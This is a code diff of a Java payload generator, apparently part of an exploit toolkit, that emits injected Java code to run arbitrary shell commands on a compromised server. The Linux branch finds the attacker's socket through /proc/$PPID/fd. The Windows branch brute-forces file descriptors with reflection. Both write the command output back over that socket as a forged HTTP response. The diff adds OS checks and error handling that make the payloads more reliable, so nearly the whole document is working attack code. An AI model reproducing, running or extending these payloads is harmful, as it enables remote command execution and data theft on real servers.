@@ -7,7 +7,7 @@ import sun.misc.BASE64Encoder;
 
 public class DirectiveProcessor{
     public static void main(String[] args) throws IOException {
-        System.out.println(process("directive:AutoFindRequestEcho"));
+        System.out.println(process("directive:WindowsEcho:whoami"));
     }
 
     public static String process(String command){
@@ -75,50 +75,61 @@ public class DirectiveProcessor{
         String cmd = command.split(":", 3)[2];
         cmd = cmd.replaceAll("\\\\","\\\\\\\\").replaceAll("\"", "\\\"");
 
-        String code = "String command  = \"ls -al /proc/$PPID/fd|grep socket:|awk 'BEGIN{FS=\\\"[\\\"}''{print $2}'|sed 's/.$//'\";\n" +
-            "    String[] cmd = new String[]{\"/bin/sh\", \"-c\", command };\n" +
-            "    java.io.BufferedReader br = new java.io.BufferedReader(new java.io.InputStreamReader(Runtime.getRuntime().exec(cmd).getInputStream()));\n" +
-            "    java.util.List res1 = new java.util.ArrayList();\n" +
-            "    String line = \"\";\n" +
-            "    while ((line = br.readLine()) != null){\n" +
-            "        res1.add(line);\n" +
-            "    }\n" +
-            "    br.close();\n" +
+        String code = "   if(java.io.File.separator.equals(\"/\")){\n" +
+            "        String command  = \"ls -al /proc/$PPID/fd|grep socket:|awk 'BEGIN{FS=\\\"[\\\"}''{print $2}'|sed 's/.$//'\";\n" +
+            "        String[] cmd = new String[]{\"/bin/sh\", \"-c\", command};\n" +
+            "        java.io.BufferedReader br = new java.io.BufferedReader(new java.io.InputStreamReader(Runtime.getRuntime().exec(cmd).getInputStream()));\n" +
+            "        java.util.List res1 = new java.util.ArrayList();\n" +
+            "        String line = \"\";\n" +
+            "        while ((line = br.readLine()) != null && !line.trim().isEmpty()){\n" +
+            "            res1.add(line);\n" +
+            "        }\n" +
+            "        br.close();\n" +
             "\n" +
-            "    Thread.sleep((long)2000);\n" +
+            "        try {\n" +
+            "            Thread.sleep((long)2000);\n" +
+            "        } catch (InterruptedException e) {\n" +
+            "            //pass\n" +
+            "        }\n" +
             "\n" +
-            "    command  = \"ls -al /proc/$PPID/fd|grep socket:|awk '{print $9, $11}'\";\n" +
-            "    cmd = new String[]{\"/bin/sh\", \"-c\", command };\n" +
-            "    br = new java.io.BufferedReader(new java.io.InputStreamReader(Runtime.getRuntime().exec(cmd).getInputStream()));\n" +
-            "    java.util.List res2 = new java.util.ArrayList();\n" +
-            "    while ((line = br.readLine()) != null){\n" +
-            "        res2.add(line);\n" +
-            "    }\n" +
-            "    br.close();\n" +
+            "        command  = \"ls -al /proc/$PPID/fd|grep socket:|awk '{print $9, $11}'\";\n" +
+            "        cmd = new String[]{\"/bin/sh\", \"-c\", command};\n" +
+            "        br = new java.io.BufferedReader(new java.io.InputStreamReader(Runtime.getRuntime().exec(cmd).getInputStream()));\n" +
+            "        java.util.List res2 = new java.util.ArrayList();\n" +
+            "        while ((line = br.readLine()) != null && !line.trim().isEmpty()){\n" +
+            "            res2.add(line);\n" +
+            "        }\n" +
+            "        br.close();\n" +
             "\n" +
-            "    int index = 0;\n" +
-            "    int max = 0;\n" +
-            "    for(int i = 0; i < res1.size(); i++){\n" +
-            "        for(int j = 0; j < res2.size(); j++){\n" +
-            "            if(((String)res2.get(j)).contains((String)res1.get(i))){\n" +
-            "                String socketNo = ((String)res2.get(j)).split(\"\\\\s+\")[1].substring(8);\n" +
+            "        int index = 0;\n" +
+            "        int max = 0;\n" +
+            "        for(int i = 0; i < res2.size(); i++){\n" +
+            "            try{\n" +
+            "                String socketNo = ((String)res2.get(i)).split(\"\\\\s+\")[1].substring(8);\n" +
             "                socketNo = socketNo.substring(0, socketNo.length() - 1);\n" +
-            "                if(Integer.parseInt(socketNo) > max) {\n" +
-            "                    max = Integer.parseInt(socketNo);\n" +
-            "                    index = j;\n" +
+            "                for(int j = 0; j < res1.size(); j++){\n" +
+            "                    if(!socketNo.equals(res1.get(j))) continue;\n" +
+            "\n" +
+            "                    if(Integer.parseInt(socketNo) > max) {\n" +
+            "                        max = Integer.parseInt(socketNo);\n" +
+            "                        index = j;\n" +
+            "                    }\n" +
+            "                    break;\n" +
             "                }\n" +
+            "            }catch(Exception e){\n" +
+            "                //pass\n" +
             "            }\n" +
             "        }\n" +
-            "    }\n" +
             "\n" +
-            "    int fd = Integer.parseInt(((String)res2.get(index)).split(\"\\\\s\")[0]);\n" +
-            "    java.lang.reflect.Constructor c= java.io.FileDescriptor.class.getDeclaredConstructor(new Class[]{Integer.TYPE});\n" +
-            "    c.setAccessible(true);\n" +
-            "    cmd = new String[]{\"/bin/sh\", \"-c\", \"" + cmd + "\" };\n" +
-            "    String res = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter(\"\\\\A\").next();\n" +
-            "    String result = \"HTTP/1.1 200 OK\\nConnection: close\\nContent-Length: \" + res.length() + \"\\n\\n\" + res + \"\\n\";\n" +
-            "    java.io.FileOutputStream os = new java.io.FileOutputStream((java.io.FileDescriptor)c.newInstance(new Object[]{new Integer(fd)}));\n" +
-            "    os.write(result.getBytes());";
+            "        int fd = Integer.parseInt(((String)res2.get(index)).split(\"\\\\s\")[0]);\n" +
+            "        java.lang.reflect.Constructor c= java.io.FileDescriptor.class.getDeclaredConstructor(new Class[]{Integer.TYPE});\n" +
+            "        c.setAccessible(true);\n" +
+            "        cmd = new String[]{\"/bin/sh\", \"-c\", \"" + cmd + "\"};\n" +
+            "        String res = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter(\"\\\\A\").next();\n" +
+            "        String result = \"HTTP/1.1 200 OK\\nConnection: close\\nContent-Length: \" + res.length() + \"\\n\\n\" + res + \"\\n\";\n" +
+            "        java.io.FileOutputStream os = new java.io.FileOutputStream((java.io.FileDescriptor)c.newInstance(new Object[]{new Integer(fd)}));\n" +
+            "        os.write(result.getBytes());\n" +
+            "    }";
 
         return code;
     }
@@ -389,56 +400,52 @@ public class DirectiveProcessor{
         String cmd = command.split(":", 3)[2];
         cmd = cmd.replaceAll("\\\\","\\\\\\\\").replaceAll("\"", "\\\"");
 
-        String code = "    java.lang.reflect.Field field = java.io.FileDescriptor.class.getDeclaredField(\"fd\");\n" +
-            "    field.setAccessible(true);\n" +
+        String code = "   if(java.io.File.separator.equals(\"\\\\\")){\n" +
+            "        java.lang.reflect.Field field = java.io.FileDescriptor.class.getDeclaredField(\"fd\");\n" +
+            "        field.setAccessible(true);\n" +
             "\n" +
-            "    Class clazz1 = Class.forName(\"sun.nio.ch.Net\");\n" +
-            "    java.lang.reflect.Method method1 = clazz1.getDeclaredMethod(\"remoteAddress\",new Class[]{java.io.FileDescriptor.class});\n" +
-            "    method1.setAccessible(true);\n" +
+            "        Class clazz1 = Class.forName(\"sun.nio.ch.Net\");\n" +
+            "        java.lang.reflect.Method method1 = clazz1.getDeclaredMethod(\"remoteAddress\",new Class[]{java.io.FileDescriptor.class});\n" +
+            "        method1.setAccessible(true);\n" +
             "\n" +
-            "    Class clazz2 = Class.forName(\"java.net.SocketOutputStream\", false, null);\n" +
-            "    java.lang.reflect.Constructor constructor2 = clazz2.getDeclaredConstructors()[0];\n" +
-            "    constructor2.setAccessible(true);\n" +
+            "        Class clazz2 = Class.forName(\"java.net.SocketOutputStream\", false, null);\n" +
+            "        java.lang.reflect.Constructor constructor2 = clazz2.getDeclaredConstructors()[0];\n" +
+            "        constructor2.setAccessible(true);\n" +
             "\n" +
-            "    Class clazz3 = Class.forName(\"java.net.PlainSocketImpl\");\n" +
-            "    java.lang.reflect.Constructor constructor3 = clazz3.getDeclaredConstructor(new Class[]{java.io.FileDescriptor.class});\n" +
-            "    constructor3.setAccessible(true);\n" +
+            "        Class clazz3 = Class.forName(\"java.net.PlainSocketImpl\");\n" +
+            "        java.lang.reflect.Constructor constructor3 = clazz3.getDeclaredConstructor(new Class[]{java.io.FileDescriptor.class});\n" +
+            "        constructor3.setAccessible(true);\n" +
             "\n" +
-            "    java.lang.reflect.Method write = clazz2.getDeclaredMethod(\"write\",new Class[]{byte[].class});\n" +
-            "    write.setAccessible(true);\n" +
+            "        java.lang.reflect.Method write = clazz2.getDeclaredMethod(\"write\",new Class[]{byte[].class});\n" +
+            "        write.setAccessible(true);\n" +
             "\n" +
-            "    java.net.InetSocketAddress remoteAddress = null;\n" +
-            "    java.util.List list1 = new java.util.ArrayList();\n" +
-            "    java.util.List list2 = new java.util.ArrayList();\n" +
-            "    java.io.FileDescriptor fileDescriptor = new java.io.FileDescriptor();\n" +
-            "    for(int i = 0; i < 10000; i++){\n" +
-            "        field.set((Object)fileDescriptor, (Object)(new Integer(i)));\n" +
-            "        try{\n" +
-            "            remoteAddress= (java.net.InetSocketAddress) method1.invoke(null, new Object[]{fileDescriptor});\n" +
-            "            if(remoteAddress.toString().startsWith(\"/127.0.0.1\")) continue;\n" +
-            "            list1.add(new Integer(i));\n" +
-            "        }catch(Exception e){}\n" +
-            "    }\n" +
+            "        java.net.InetSocketAddress remoteAddress = null;\n" +
+            "        java.util.List list = new java.util.ArrayList();\n" +
+            "        java.io.FileDescriptor fileDescriptor = new java.io.FileDescriptor();\n" +
+            "        for(int i = 0; i < 50000; i++){\n" +
+            "            field.set((Object)fileDescriptor, (Object)(new Integer(i)));\n" +
+            "            try{\n" +
+            "                remoteAddress= (java.net.InetSocketAddress) method1.invoke(null, new Object[]{fileDescriptor});\n" +
+            "                if(remoteAddress.toString().startsWith(\"/127.0.0.1\")) continue;\n" +
+            "                if(remoteAddress.toString().startsWith(\"/0:0:0:0:0:0:0:1\")) continue;\n" +
+            "                list.add(new Integer(i));\n" +
             "\n" +
-            "    Thread.sleep((long)2000);\n" +
-            "    for(int i = 0; i < 10000; i++){\n" +
-            "        field.set((Object)fileDescriptor, (Object)(new Integer(i)));\n" +
-            "        try{\n" +
-            "            remoteAddress = (java.net.InetSocketAddress) method1.invoke(null, new Object[]{fileDescriptor});\n" +
-            "            if(remoteAddress.toString().startsWith(\"/127.0.0.1\")) continue;\n" +
-            "            list2.add(new Integer(i));\n" +
-            "        }catch(Exception e){}\n" +
-            "    }\n" +
+            "            }catch(Exception e){}\n" +
+            "        }\n" +
             "\n" +
-            "    list1.retainAll(list2);\n" +
-            "    for(int i = 0; i < list1.size(); i++){\n" +
-            "        try{\n" +
-            "            field.set((Object)fileDescriptor, list1.get(i));\n" +
-            "            Object socketOutputStream = constructor2.newInstance(new Object[]{constructor3.newInstance(new Object[]{fileDescriptor})});\n" +
-            "            String res = new java.util.Scanner(Runtime.getRuntime().exec(\"" + cmd + "\").getInputStream()).useDelimiter(\"\\\\A\").next();\n" +
-            "            String result = \"HTTP/1.1 200 OK\\nConnection: close\\nContent-Length: \" + res.length() + \"\\n\\n\" + res + \"\\n\";\n" +
-            "            write.invoke(socketOutputStream,  new Object[]{result.getBytes()});\n" +
-            "        }catch (Exception e){}\n" +
+            "        for(int i = list.size() - 1; i >= 0; i--){\n" +
+            "            try{\n" +
+            "                field.set((Object)fileDescriptor, list.get(i));\n" +
+            "                Object socketOutputStream = constructor2.newInstance(new Object[]{constructor3.newInstance(new Object[]{fileDescriptor})});\n" +
+            "                String[] cmd = new String[]{\"cmd\",\"/C\", \"" + cmd + "\"};\n" +
+            "                String res = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter(\"\\\\A\").next().trim();\n" +
+            "                String result = \"HTTP/1.1 200 OK\\nConnection: close\\nContent-Length: \" + (res.length()) + \"\\n\\n\" + res + \"\\n\\n\";\n" +
+            "                write.invoke(socketOutputStream, new Object[]{result.getBytes()});\n" +
+            "                break;\n" +
+            "            }catch (Exception e){\n" +
+            "                //pass\n" +
+            "            }\n" +
+            "        }\n" +
             "    }";
         return code;
     }
